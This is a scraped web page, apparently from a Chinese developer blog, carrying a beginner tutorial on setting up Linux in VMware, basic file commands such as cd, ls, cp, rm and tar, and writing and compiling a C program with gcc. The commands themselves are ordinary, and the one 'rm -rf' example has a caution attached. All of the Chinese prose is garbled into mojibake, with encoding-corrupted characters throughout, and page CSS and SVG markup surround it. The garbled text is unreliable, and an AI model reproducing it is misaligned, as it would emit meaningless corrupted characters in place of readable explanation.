                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨æœåŠ¡å™¨ç®¡ç†ã€å¼€å‘è¿ç»´åŠåµŒå…¥å¼å¼€å‘é¢†åŸŸï¼ŒLinux ç³»ç»Ÿæ˜¯ä¸å¯æˆ–ç¼ºçš„å·¥å…·ã€‚æŒæ¡ Linux æŒ‡ä»¤æ“ä½œä¸åŸºç¡€å¼€å‘æµç¨‹ï¼Œæ˜¯æå‡å·¥ä½œæ•ˆç‡ã€æ­å»ºæŠ€æœ¯èƒ½åŠ›ä½“ç³»çš„æ ¸å¿ƒã€‚æœ¬æ–‡åŸºäºå®æˆ˜åœºæ™¯ï¼Œç³»ç»Ÿæ¢³ç† Linux ç¯å¢ƒæ­å»ºã€æ–‡ä»¶ç®¡ç†ã€æŒ‡ä»¤æ“ä½œåŠ C è¯­è¨€å¼€å‘å…¨æµç¨‹ï¼Œé™„å¸¦è¯¦ç»†æ¡ˆä¾‹ä¸é¿å‘æŒ‡å—ï¼ŒåŠ©åŠ›ä»å…¥é—¨åˆ°ç†Ÿç»ƒåº”ç”¨ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b3c9cec057a142d28cb94dd448c9d6ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5bCP5p2o5ZCM5a2mNDk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767492508&amp;x-signature=3VAYmL5iJJPSK%2FVDumiGA3rIAaU%3D" alt="å±å¹•æˆªå›¾ 2025-12-28 100537.png" loading="lazy"/></p>
<h2 data-id="heading-0">ä¸€ã€Linux ç¯å¢ƒæ­å»ºï¼šä»å®‰è£…åˆ°ç»ˆç«¯é…ç½®</h2>
<p>ç¯å¢ƒæ­å»ºæ˜¯ Linux å­¦ä¹ çš„ç¬¬ä¸€æ­¥ï¼Œå¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼Œç¡®ä¿åç»­æ“ä½œé¡ºç•…ã€‚</p>
<h3 data-id="heading-1">1. æ ¸å¿ƒç»„ä»¶å®‰è£…</h3>

























<table><thead><tr><th>ç»„ä»¶</th><th>å®‰è£…æ­¥éª¤</th><th>å¸¸è§é—®é¢˜ä¸è§£å†³</th></tr></thead><tbody><tr><td>VMware è™šæ‹Ÿæœº</td><td>1. ä¸‹è½½å¯¹åº”ç³»ç»Ÿç‰ˆæœ¬çš„ VMwareï¼›2. æŒ‰ç…§å‘å¯¼å®Œæˆå®‰è£…</td><td>å®‰è£…åç•Œé¢ä¸ºè‹±æ–‡ï¼šå¸è½½åé‡æ–°å®‰è£…ï¼Œé€‰æ‹©ä¸­æ–‡è¯­è¨€åŒ…</td></tr><tr><td>Ubuntu ç³»ç»Ÿ</td><td>1. ä¸‹è½½ Ubuntu é•œåƒï¼ˆæ¨è 20.04 LTS ç‰ˆæœ¬ï¼‰ï¼›2. åœ¨ VMware ä¸­åˆ›å»ºè™šæ‹Ÿæœºå¹¶åŠ è½½é•œåƒ</td><td>æ— æ³•è”ç½‘ï¼š1. æ£€æŸ¥æ˜¯å¦å¯ç”¨ â€œæ¡¥æ¥ç½‘ç»œé€‚é…å™¨â€ï¼›2. è‹¥ç¼ºå¤± VMware ç½‘å¡ï¼Œå¸è½½å¹¶é‡æ–°å®‰è£… VMwareï¼›3. å‚è€ƒ â€œå¢¨å¤©è½®â€ ç›¸å…³æ•™ç¨‹é…ç½®ç½‘ç»œ</td></tr><tr><td>Xmind æ€ç»´å¯¼å›¾</td><td>ç”¨äºæ¢³ç†æŒ‡ä»¤é€»è¾‘ä¸å­¦ä¹ æ¡†æ¶ï¼Œç›´æ¥ä¸‹è½½ Linux ç‰ˆæœ¬å®‰è£…å³å¯</td><td>å¯åŠ¨æŠ¥é”™ï¼šæ£€æŸ¥ Java ç¯å¢ƒï¼Œå®‰è£… OpenJDK 11 åŠä»¥ä¸Šç‰ˆæœ¬</td></tr></tbody></table>
<h3 data-id="heading-2">2. ç»ˆç«¯åŸºç¡€é…ç½®</h3>
<p>ç»ˆç«¯æ˜¯ Linux æ“ä½œçš„æ ¸å¿ƒå…¥å£ï¼Œåˆç†é…ç½®èƒ½å¤§å¹…æå‡æ•ˆç‡ï¼š</p>
<ul>
<li><strong>æ‰“å¼€ç»ˆç«¯</strong>ï¼šåœ¨æ¡Œé¢æˆ–ç›®å½•ç©ºç™½å¤„å³é”®ï¼Œé€‰æ‹© â€œåœ¨ç»ˆç«¯ä¸­æ‰“å¼€â€ï¼Œæˆ–ä½¿ç”¨å¿«æ·é”®<code>Ctrl+Alt+T</code>ã€‚</li>
<li><strong>å­—ä½“å¤§å°è°ƒæ•´</strong>ï¼šç»ˆç«¯å†…å³é”®â†’â€œé…ç½®æ–‡ä»¶é¦–é€‰é¡¹â€â†’â€œå­—ä½“â€ï¼Œé€‰æ‹© â€œMonospace Regularâ€ å­—ä½“ï¼Œæ¨è 12-14 å·å¤§å°ï¼Œå…¼é¡¾æ¸…æ™°åº¦ä¸æ˜¾ç¤ºèŒƒå›´ã€‚</li>
<li><strong>ç»ˆç«¯æç¤ºç¬¦å«ä¹‰</strong>ï¼šé»˜è®¤æ˜¾ç¤ºæ ¼å¼ä¸º<code>ç”¨æˆ·å@è®¡ç®—æœºå:å½“å‰ä½ç½®$</code>ï¼ˆæ™®é€šç”¨æˆ·ï¼‰æˆ–<code>#</code>ï¼ˆroot ç”¨æˆ·ï¼‰ï¼Œä¾‹å¦‚<code>zcy@xyd:~$</code>ä¸­ï¼Œ<code>~</code>ä»£è¡¨å½“å‰ç”¨æˆ·çš„å®¶ç›®å½•ï¼ˆ<code>/home/zcy</code>ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-3">äºŒã€Linux æ–‡ä»¶ç³»ç»Ÿä¸æ ¸å¿ƒæŒ‡ä»¤ï¼šå®æˆ˜æ“ä½œæŒ‡å—</h2>
<p>Linux é‡‡ç”¨ â€œå€’çŠ¶æ ‘â€ å‹ç›®å½•ç»“æ„ï¼Œæ ¹ç›®å½•ï¼ˆ<code>/</code>ï¼‰æ˜¯æ‰€æœ‰ç›®å½•çš„èµ·ç‚¹ã€‚æŒæ¡å¸¸ç”¨ç›®å½•åŠŸèƒ½ä¸æŒ‡ä»¤ï¼Œæ˜¯æ–‡ä»¶ç®¡ç†çš„åŸºç¡€ã€‚</p>
<h3 data-id="heading-4">1. å…³é”®ç›®å½•åŠŸèƒ½è§£æ</h3>






























<table><thead><tr><th>ç›®å½•è·¯å¾„</th><th>æ ¸å¿ƒåŠŸèƒ½</th><th>æ“ä½œåœºæ™¯ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>/etc</code></td><td>å­˜æ”¾ç³»ç»Ÿå…¨å±€é…ç½®æ–‡ä»¶ï¼ˆå¦‚ç¯å¢ƒå˜é‡ã€æœåŠ¡é…ç½®ï¼‰</td><td>ä¿®æ”¹<code>/etc/profile</code>é…ç½®å…¨å±€ç¯å¢ƒå˜é‡ï¼Œé…ç½®<code>/etc/nginx</code>ä¸‹çš„ Nginx æœåŠ¡</td></tr><tr><td><code>/home</code></td><td>æ™®é€šç”¨æˆ·çš„å®¶ç›®å½•ï¼Œæ¯ä¸ªç”¨æˆ·å¯¹åº”ç‹¬ç«‹å­ç›®å½•</td><td>æ—¥å¸¸æ–‡ä»¶å­˜å‚¨ã€é¡¹ç›®å¼€å‘ï¼Œå¦‚<code>/home/zcy/project</code>å­˜æ”¾ä¸ªäººé¡¹ç›®</td></tr><tr><td><code>/usr/local</code></td><td>ç”¨æˆ·è‡ªå®šä¹‰è½¯ä»¶å®‰è£…ç›®å½•ï¼ˆéç³»ç»Ÿé»˜è®¤ï¼‰</td><td>å®‰è£…æºç ç¼–è¯‘çš„è½¯ä»¶ï¼ˆå¦‚ Python 3.10ï¼‰ï¼Œé¿å…å¹²æ‰°ç³»ç»Ÿé»˜è®¤è½¯ä»¶</td></tr><tr><td><code>/mnt</code></td><td>ä¸´æ—¶æŒ‚è½½ç›®å½•ï¼Œç”¨äºæŒ‚è½½ U ç›˜ã€ç§»åŠ¨ç¡¬ç›˜ç­‰å¤–éƒ¨è®¾å¤‡</td><td>æŒ‚è½½ U ç›˜ï¼š<code>mount /dev/sdb1 /mnt/usb</code>ï¼ŒæŒ‚è½½ååœ¨<code>/mnt/usb</code>è®¿é—® U ç›˜å†…å®¹</td></tr></tbody></table>
<h3 data-id="heading-5">2. é«˜é¢‘æŒ‡ä»¤å®æˆ˜ï¼ˆé™„æ¡ˆä¾‹ï¼‰</h3>
<p>æŒ‡ä»¤æ ¼å¼é€šç”¨ä¸º â€œ<code>æŒ‡ä»¤ [é€‰é¡¹] [å‚æ•°]</code>â€ï¼Œä»¥ä¸‹æ˜¯æ–‡ä»¶ç®¡ç†ã€ç›®å½•æ“ä½œçš„æ ¸å¿ƒæŒ‡ä»¤ï¼Œé™„å¸¦å®é™…æ“ä½œæ¡ˆä¾‹ä¸æ•ˆæœè¯´æ˜ï¼š</p>
<h4 data-id="heading-6">ï¼ˆ1ï¼‰ç›®å½•ä¸è·¯å¾„ç›¸å…³</h4>





























<table><thead><tr><th>æŒ‡ä»¤</th><th>åŠŸèƒ½</th><th>ç¤ºä¾‹</th><th>æ•ˆæœè¯´æ˜</th></tr></thead><tbody><tr><td><code>pwd</code></td><td>æ˜¾ç¤ºå½“å‰ä½ç½®çš„ç»å¯¹è·¯å¾„</td><td><code>pwd</code></td><td>è¾“å‡º<code>/home/zcy/204</code>ï¼Œç¡®è®¤å½“å‰æ‰€åœ¨ç›®å½•</td></tr><tr><td><code>cd</code></td><td>åˆ‡æ¢ç›®å½•</td><td>1.Â <code>cd 204</code>ï¼ˆç›¸å¯¹è·¯å¾„ï¼‰2.Â <code>cd /home/zcy/204</code>ï¼ˆç»å¯¹è·¯å¾„ï¼‰3.Â <code>cd ..</code>ï¼ˆè¿”å›ä¸Šä¸€çº§ï¼‰4.Â <code>cd ~</code>æˆ–<code>cd</code>ï¼ˆå›åˆ°å®¶ç›®å½•ï¼‰</td><td>1. ä»å®¶ç›®å½•è¿›å…¥<code>204</code>å­ç›®å½•ï¼›2. ç›´æ¥é€šè¿‡ç»å¯¹è·¯å¾„å®šä½åˆ°<code>204</code>ç›®å½•ï¼›3. ä»<code>/home/zcy/204</code>è¿”å›<code>/home/zcy</code>ï¼›4. æ— è®ºå½“å‰åœ¨å“ªä¸ªç›®å½•ï¼Œç›´æ¥å›åˆ°<code>/home/zcy</code></td></tr><tr><td><code>ls</code></td><td>åˆ—å‡ºç›®å½•å†…å®¹</td><td>1.Â <code>ls</code>ï¼ˆé»˜è®¤ï¼‰2.Â <code>ls -a</code>ï¼ˆæ˜¾ç¤ºéšè—æ–‡ä»¶ï¼‰3.Â <code>ls -l</code>ï¼ˆæ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼‰4.Â <code>ls -la</code>ï¼ˆç»„åˆï¼šæ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶è¯¦ç»†ä¿¡æ¯ï¼‰</td><td>1. è¾“å‡º<code>204 å…¬å…±çš„ æ¨¡æ¿ è§†é¢‘</code>ç­‰å¯è§ç›®å½• / æ–‡ä»¶ï¼›2. æ˜¾ç¤º<code>.bashrc</code>ã€<code>.cache</code>ç­‰éšè—æ–‡ä»¶ï¼ˆä»¥<code>.</code>å¼€å¤´ï¼‰ï¼›3. è¾“å‡ºæƒé™ã€æ‰€æœ‰è€…ã€å¤§å°ã€ä¿®æ”¹æ—¶é—´ç­‰ï¼Œå¦‚<code>drwxr-xr-x 2 zcy zcy 4096 12æœˆ25 23:34 å…¬å…±çš„</code>ï¼›4. åŒæ—¶æ˜¾ç¤ºéšè—æ–‡ä»¶ä¸è¯¦ç»†ä¿¡æ¯ï¼Œé€‚åˆç³»ç»Ÿé…ç½®æ–‡ä»¶ç®¡ç†</td></tr></tbody></table>
<h4 data-id="heading-7">ï¼ˆ2ï¼‰æ–‡ä»¶æ“ä½œç›¸å…³</h4>















































<table><thead><tr><th>æŒ‡ä»¤</th><th>åŠŸèƒ½</th><th>ç¤ºä¾‹</th><th>æ³¨æ„äº‹é¡¹</th></tr></thead><tbody><tr><td><code>touch</code></td><td>åˆ›å»ºç©ºæ–‡ä»¶æˆ–æ›´æ–°æ–‡ä»¶æ—¶é—´æˆ³</td><td><code>touch a.txt</code></td><td>è‹¥<code>a.txt</code>ä¸å­˜åœ¨ï¼Œåˆ›å»ºç©ºæ–‡ä»¶ï¼›è‹¥å·²å­˜åœ¨ï¼Œæ›´æ–°å…¶è®¿é—® / ä¿®æ”¹æ—¶é—´ï¼ˆå†…å®¹ä¸å˜ï¼‰</td></tr><tr><td><code>mkdir</code></td><td>åˆ›å»ºç›®å½•</td><td>1.Â <code>mkdir 204</code>ï¼ˆå•ç›®å½•ï¼‰2.Â <code>mkdir a b c</code>ï¼ˆå¤šç›®å½•ï¼‰3.Â <code>mkdir -p A/B/C</code>ï¼ˆå¤šçº§ç›®å½•ï¼‰</td><td>è‹¥åˆ›å»ºå¤šçº§ç›®å½•ï¼ˆå¦‚<code>A/B/C</code>ï¼‰ï¼Œå¿…é¡»åŠ <code>-p</code>é€‰é¡¹ï¼Œå¦åˆ™ä¼šå› çˆ¶ç›®å½•ä¸å­˜åœ¨æŠ¥é”™</td></tr><tr><td><code>cp</code></td><td>å¤åˆ¶æ–‡ä»¶ / ç›®å½•</td><td>1.Â <code>cp a.txt ../a</code>ï¼ˆå¤åˆ¶æ–‡ä»¶åˆ°ä¸Šçº§<code>a</code>ç›®å½•ï¼‰2.Â <code>cp -r a d</code>ï¼ˆå¤åˆ¶<code>a</code>ç›®å½•åˆ°<code>d</code>ç›®å½•ï¼‰</td><td>å¤åˆ¶ç›®å½•æ—¶å¿…é¡»åŠ <code>-r</code>ï¼ˆé€’å½’ï¼‰é€‰é¡¹ï¼Œå¦åˆ™ä¼šæç¤º â€œç•¥è¿‡ç›®å½•â€ï¼›è¦†ç›–æ–‡ä»¶å‰å¯åŠ <code>-i</code>é€‰é¡¹ï¼ˆäº¤äº’å¼ç¡®è®¤ï¼‰</td></tr><tr><td><code>mv</code></td><td>ç§»åŠ¨æ–‡ä»¶ / ç›®å½•æˆ–é‡å‘½å</td><td>1.Â <code>mv a.c c</code>ï¼ˆç§»åŠ¨<code>a.c</code>åˆ°<code>c</code>ç›®å½•ï¼‰2.Â <code>mv a.c c.c</code>ï¼ˆé‡å‘½å<code>a.c</code>ä¸º<code>c.c</code>ï¼‰</td><td>ç§»åŠ¨ä¸é‡å‘½åé€»è¾‘ä¸€è‡´ï¼šè‹¥ç›®æ ‡è·¯å¾„æ˜¯ç°æœ‰ç›®å½•ï¼Œåˆ™ç§»åŠ¨ï¼›è‹¥ç›®æ ‡è·¯å¾„æ˜¯æ–°åç§°ï¼Œåˆ™é‡å‘½å</td></tr><tr><td><code>rm</code></td><td>åˆ é™¤æ–‡ä»¶ / ç›®å½•ï¼ˆæ°¸ä¹…åˆ é™¤ï¼‰</td><td>1.Â <code>rm c.c</code>ï¼ˆåˆ é™¤æ–‡ä»¶ï¼‰2.Â <code>rm -r d</code>ï¼ˆåˆ é™¤<code>d</code>ç›®å½•åŠå†…å®¹ï¼‰3.Â <code>rm -rf temp</code>ï¼ˆå¼ºåˆ¶åˆ é™¤<code>temp</code>ç›®å½•ï¼Œæ— æç¤ºï¼‰</td><td><strong>æåº¦è°¨æ…ä½¿ç”¨</strong>ï¼š<code>rm -rf</code>ä¼šç›´æ¥åˆ é™¤ä¸”æ— æ³•æ¢å¤ï¼Œé¿å…åœ¨æ ¹ç›®å½•ï¼ˆ<code>/</code>ï¼‰ä¸‹ä½¿ç”¨ï¼›åˆ é™¤å‰å¯åŠ <code>-i</code>é€‰é¡¹ç¡®è®¤</td></tr><tr><td><code>cat</code></td><td>æŸ¥çœ‹æ–‡ä»¶å†…å®¹</td><td>1.Â <code>cat a.c</code>ï¼ˆç›´æ¥æ˜¾ç¤ºå†…å®¹ï¼‰2.Â <code>cat -n a.c</code>ï¼ˆæ˜¾ç¤ºè¡Œå·ï¼‰</td><td>é€‚åˆæŸ¥çœ‹å°æ–‡ä»¶ï¼›å¤§æ–‡ä»¶å»ºè®®ç”¨<code>less</code>æˆ–<code>more</code>ï¼ˆåˆ†é¡µæŸ¥çœ‹ï¼‰ï¼Œé¿å…å†…å®¹åˆ·å±</td></tr></tbody></table>
<h4 data-id="heading-8">ï¼ˆ3ï¼‰å‹ç¼©ä¸è§£å‹</h4>





























<table><thead><tr><th>æŒ‡ä»¤</th><th>åŠŸèƒ½</th><th>ç¤ºä¾‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>tar -cvf</code></td><td>æ‰“åŒ…ç›®å½•ï¼ˆæ— å‹ç¼©ï¼‰</td><td><code>tar -cvf 204.tar 204</code></td><td>æ‰“åŒ…<code>204</code>ç›®å½•ä¸º<code>204.tar</code>ï¼Œ<code>-c</code>ï¼ˆåˆ›å»ºï¼‰ã€<code>-v</code>ï¼ˆæ˜¾ç¤ºè¿‡ç¨‹ï¼‰ã€<code>-f</code>ï¼ˆæŒ‡å®šæ–‡ä»¶åï¼‰</td></tr><tr><td><code>tar -xvf</code></td><td>è§£å‹æ‰“åŒ…æ–‡ä»¶</td><td><code>tar -xvf 204.tar</code></td><td>è§£å‹<code>204.tar</code>åˆ°å½“å‰ç›®å½•ï¼Œ<code>-x</code>ï¼ˆè§£å‹ï¼‰ã€<code>-v</code>ï¼ˆæ˜¾ç¤ºè¿‡ç¨‹ï¼‰ã€<code>-f</code>ï¼ˆæŒ‡å®šæ–‡ä»¶åï¼‰</td></tr><tr><td><code>tar -zcvf</code></td><td>æ‰“åŒ…å¹¶å‹ç¼©ï¼ˆgzip æ ¼å¼ï¼‰</td><td><code>tar -zcvf 204.gz 204</code></td><td>åœ¨æ‰“åŒ…åŸºç¡€ä¸ŠåŠ <code>-z</code>é€‰é¡¹ï¼Œç”Ÿæˆ<code>204.gz</code>å‹ç¼©æ–‡ä»¶ï¼Œå‹ç¼©ç‡æ›´é«˜</td></tr></tbody></table>
<h2 data-id="heading-9">ä¸‰ã€Linux ä¸‹ C è¯­è¨€å¼€å‘ï¼šä»ç¼–å†™åˆ°è¿è¡Œ</h2>
<p>Linux æ˜¯ C è¯­è¨€å¼€å‘çš„å¸¸ç”¨ç¯å¢ƒï¼ŒæŒæ¡ â€œç¼–å†™ - ç¼–è¯‘ - è¿è¡Œâ€ æµç¨‹ï¼Œæ˜¯åç»­åµŒå…¥å¼ã€ç³»ç»Ÿå¼€å‘çš„åŸºç¡€ã€‚</p>
<h3 data-id="heading-10">1. C è¯­è¨€ç¨‹åºåŸºç¡€æ¡†æ¶</h3>
<h4 data-id="heading-11">ï¼ˆ1ï¼‰æ ‡å‡†æ¨¡æ¿ï¼ˆä»¥æ‰“å°ä¸ªäººä¿¡æ¯ä¸ºä¾‹ï¼‰</h4>
<p>c</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// é¢„å¤„ç†å‘½ä»¤ï¼šåŒ…å«æ ‡å‡†è¾“å…¥è¾“å‡ºåº“å¤´æ–‡ä»¶</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-comment">// ä¸»å‡½æ•°ï¼šç¨‹åºå…¥å£ï¼Œæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªmainå‡½æ•°</span>
<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-comment">// æ‰“å°ä¸ªäººä¿¡æ¯ï¼Œ\næ˜¯æ¢è¡Œç¬¦ï¼ˆè½¬ä¹‰ç¬¦ï¼‰</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"å§“åï¼šå¼ ä¸‰\n"</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ä¸“ä¸šï¼šè®¡ç®—æœºç§‘å­¦ä¸æŠ€æœ¯\n"</span>);
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"å­¦æ ¡ï¼šXXå¤§å­¦\n"</span>);
    
    <span class="hljs-comment">// å‡½æ•°è¿”å›å€¼ï¼š0è¡¨ç¤ºç¨‹åºæ­£å¸¸ç»“æŸï¼Œé0è¡¨ç¤ºå¼‚å¸¸</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>
<h4 data-id="heading-12">ï¼ˆ2ï¼‰ç¼–ç è§„èŒƒï¼ˆé¿å‘å…³é”®ï¼‰</h4>
<ol>
<li>
<p><strong>è¯­å¥æ ¼å¼</strong>ï¼šæ¯è¡Œåªå†™ä¸€å¥ä»£ç ï¼Œå¿…é¡»ä»¥åˆ†å·ï¼ˆ<code>;</code>ï¼‰ç»“å°¾ï¼Œåˆ†å·ä¸ºè‹±æ–‡ç¬¦å·ï¼ˆå¸¸è§é”™è¯¯ï¼šç”¨ä¸­æ–‡åˆ†å·å¯¼è‡´ç¼–è¯‘æŠ¥é”™ï¼‰ã€‚</p>
</li>
<li>
<p><strong>ä»£ç ç¼©è¿›</strong>ï¼šä½¿ç”¨ 4 ä¸ªç©ºæ ¼æˆ– 1 ä¸ª Tab ç¼©è¿›ï¼ŒåŒºåˆ†ä»£ç å—ï¼ˆå¦‚<code>main</code>å‡½æ•°å†…çš„æ‰“å°è¯­å¥ï¼‰ï¼Œæå‡å¯è¯»æ€§ã€‚</p>
</li>
<li>
<p><strong>æ³¨é‡Šç¼–å†™</strong>ï¼š</p>
<ul>
<li>
<p>å•è¡Œæ³¨é‡Šï¼š<code>// æ³¨é‡Šå†…å®¹</code>ï¼Œç”¨äºè§£é‡Šå•è¡Œä»£ç ï¼›</p>
</li>
<li>
<p>å¤šè¡Œæ³¨é‡Šï¼š<code>/* æ³¨é‡Šå†…å®¹ */</code>ï¼Œç”¨äºè¯´æ˜æ–‡ä»¶åŠŸèƒ½ã€ä½œè€…ã€æ—¥æœŸç­‰ï¼Œä¾‹å¦‚ï¼š</p>
<p>c</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-markdown" lang="markdown">/*
<span class="hljs-bullet"> *</span> æ–‡ä»¶åç§°ï¼šinfo.c
<span class="hljs-bullet"> *</span> ä½œè€…ï¼šå¼ ä¸‰
<span class="hljs-bullet"> *</span> æ—¥æœŸï¼š2025-12-26
<span class="hljs-bullet"> *</span> åŠŸèƒ½ï¼šæ‰“å°ä¸ªäººåŸºæœ¬ä¿¡æ¯
 <span class="hljs-emphasis">*/
</span></code></pre>
</li>
</ul>
</li>
</ol>
<h3 data-id="heading-13">2. ç¼–è¯‘ä¸è¿è¡Œï¼ˆä½¿ç”¨ gcc ç¼–è¯‘å™¨ï¼‰</h3>
<h4 data-id="heading-14">ï¼ˆ1ï¼‰gcc å®‰è£…</h4>
<p>é¦–æ¬¡ä½¿ç”¨éœ€å®‰è£… gcc ç¼–è¯‘å™¨ï¼Œç»ˆç«¯æ‰§è¡Œå‘½ä»¤ï¼š</p>
<p>bash</p>
<p>è¿è¡Œ</p>
<pre><code class="hljs language-bash" lang="bash">sudo apt install gcc  <span class="hljs-comment"># Ubuntu/Debianç³»ç»Ÿ</span>
<span class="hljs-comment"># éªŒè¯å®‰è£…ï¼šè¾“å‡ºgccç‰ˆæœ¬ä¿¡æ¯ï¼ˆå¦‚9.4.0ï¼‰</span>
gcc -v
</code></pre>
<h4 data-id="heading-15">ï¼ˆ2ï¼‰ç¼–è¯‘æ–¹å¼ï¼ˆä¸¤ç§å¸¸ç”¨æ–¹å¼ï¼‰</h4>




















<table><thead><tr><th>ç¼–è¯‘æ–¹å¼</th><th>å‘½ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>é»˜è®¤ç¼–è¯‘</td><td><code>gcc info.c</code></td><td>ç¼–è¯‘<code>info.c</code>æ–‡ä»¶ï¼Œç”Ÿæˆé»˜è®¤å¯æ‰§è¡Œæ–‡ä»¶<code>a.out</code>ï¼›è‹¥å†æ¬¡ç¼–è¯‘å…¶ä»–æ–‡ä»¶ï¼ˆå¦‚<code>test.c</code>ï¼‰ï¼Œ<code>a.out</code>ä¼šè¢«è¦†ç›–</td></tr><tr><td>è‡ªå®šä¹‰ç¼–è¯‘</td><td><code>gcc info.c -o info</code></td><td>ç¼–è¯‘<code>info.c</code>ï¼Œç”Ÿæˆåä¸º<code>info</code>çš„å¯æ‰§è¡Œæ–‡ä»¶ï¼›é¿å…æ–‡ä»¶è¦†ç›–ï¼Œæ¨èç”¨æºæ–‡ä»¶åä½œä¸ºå¯æ‰§è¡Œæ–‡ä»¶å</td></tr></tbody></table>
